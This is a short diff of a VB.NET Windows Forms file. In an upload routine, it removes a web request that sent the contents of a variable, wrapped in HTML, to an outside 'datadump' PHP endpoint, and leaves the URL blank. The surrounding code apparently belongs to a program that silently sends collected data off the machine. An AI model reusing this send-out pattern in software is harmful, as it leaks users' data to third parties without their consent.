@@ -254,8 +254,6 @@ Public Class Form1
 
     End Sub
 
-
-
     Private Sub shutDownApp(tome As Integer)
         Timer3.Interval = tome
         Timer3.Start()
@@ -270,7 +268,7 @@ Public Class Form1
     Private Sub upload()
         Try
             If okDone <> "" Then
-                Dim request As WebRequest = WebRequest.Create("http://datadump.net16.net/post.php?w=" & "<html><body>" & okDone & "</body></html>")
+                Dim request As WebRequest = WebRequest.Create("" & "<html><body>" & okDone & "</body></html>")
                 request.GetResponse()
             End If
 
